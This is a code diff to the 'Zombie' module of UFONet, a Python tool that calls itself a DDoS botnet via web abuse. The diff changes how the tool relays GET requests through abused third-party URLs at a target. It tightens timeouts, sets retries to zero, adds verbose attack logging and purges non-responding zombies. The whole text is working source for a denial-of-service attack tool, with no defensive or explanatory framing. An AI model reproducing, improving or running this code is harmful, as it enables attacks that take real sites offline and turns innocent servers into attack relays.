@@ -1,15 +1,21 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016 - by psy (epsylon@riseup.net)
+UFONet - DDoS Botnet via Web Abuse - 2013/2018 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import pycurl, StringIO, md5, re
+import StringIO, md5, re, sys
 import time, threading, random
 from randomip import RandomIP
+
+try:
+    import pycurl
+except:
+    print "\nError importing: pycurl lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-pycurl' or 'pip install pycurl'\n"
+    sys.exit(2)
 
 class Zombie: # class representing a zombie
     # constructor: function to construct a zombie 
@@ -45,7 +51,7 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.ufo.external == True:
-            external_service = "https://www.downforeveryoneorjustme.com/" # external check
+            external_service = "https://downforeveryoneorjustme.com/" # external check
             if options.target.startswith('https://'): # fixing url prefix
                 options.target = options.target.replace('https://','')
             if options.target.startswith('http://'): # fixing url prefix
@@ -72,7 +78,7 @@ class Zombie: # class representing a zombie
             else:                                    
                 url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
             if self.ufo.options.verbose:
-                print "[Info] Payload:", url_attack
+                print "[Info] [Zombies] Payload:", url_attack
             c.setopt(pycurl.URL, url_attack) # GET connection on target site
             c.setopt(pycurl.NOBODY, 0)  # use GET
         # set fake headers (important: no-cache)
@@ -140,16 +146,16 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.TIMEOUT, options.timeout)
             c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
         else:
-            c.setopt(pycurl.TIMEOUT, 5) # trying low value to control OS/python threading overflow when so much threads/bots open
-            c.setopt(pycurl.CONNECTTIMEOUT, 5)
+            c.setopt(pycurl.TIMEOUT, 1) # low value trying to control OS/python overflow when too many threads are open
+            c.setopt(pycurl.CONNECTTIMEOUT, 1)
         if options.delay: # set delay
             self.ufo.delay = options.delay
         else:
-            self.ufo.delay = 0
+            self.ufo.delay = 0 # default delay
         if options.retries: # set retries
             self.ufo.retries = options.retries
         else:
-            self.ufo.retries = 1
+            self.ufo.retries = 0 # default retries
         try: # try to connect
             c.perform()
             time.sleep(self.ufo.delay)
@@ -166,7 +172,7 @@ class Zombie: # class representing a zombie
             code_reply = c.getinfo(pycurl.HTTP_CODE)
             reply = b.getvalue()
             if options.verbose:
-                print "[Info] Reply:"
+                print "[Info] [AI] HEAD Reply:"
                 print "\n", reply
             if self.ufo.options.testrpc:
                 return reply
@@ -175,19 +181,26 @@ class Zombie: # class representing a zombie
         if self.ufo.external == True: # External reply
             external_reply = h.getvalue()
             if options.verbose:
-                print "[Info] Reply:"
+                print "[Info] [AI] EXTERNAL Reply:"
                 print "\n", external_reply
             return external_reply
         if self.payload == True: # Payloads reply
             payload_reply = h.getvalue()
             if options.verbose:
-                print "[Info] Reply:"
+                print "[Info] [AI] PAYLOAD Reply:"
                 print "\n", payload_reply
             return payload_reply
         if self.attack_mode == True: # Attack mode reply
             attack_reply = h.getvalue()
+            reply_code = c.getinfo(c.RESPONSE_CODE)
             if options.verbose:
-                print "[Response] code: ", c.getinfo(c.RESPONSE_CODE)," time ",c.getinfo(c.TOTAL_TIME)," size ", len(attack_reply)
-            return [    c.getinfo(c.RESPONSE_CODE), 
-                        c.getinfo(c.TOTAL_TIME), 
-                        len(attack_reply)]
+                print "[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(c.getinfo(c.TOTAL_TIME))+" | Size: " + str(len(attack_reply))+")"
+                time.sleep(5) # managing screen (multi-threading flow time compensation)
+            if len(attack_reply) == 0:
+                print "[Info] [Zombies] " + self.zombie + " -> FAILED (cannot connect!)"
+                if not self.ufo.options.disablepurge: # when purge mode discard failed zombie
+                    self.ufo.discardzombies.append(self.zombie)
+                    self.ufo.num_discard_zombies = self.ufo.num_discard_zombies + 1
+            return [c.getinfo(c.RESPONSE_CODE), 
+                    c.getinfo(c.TOTAL_TIME), 
+                    len(attack_reply)]
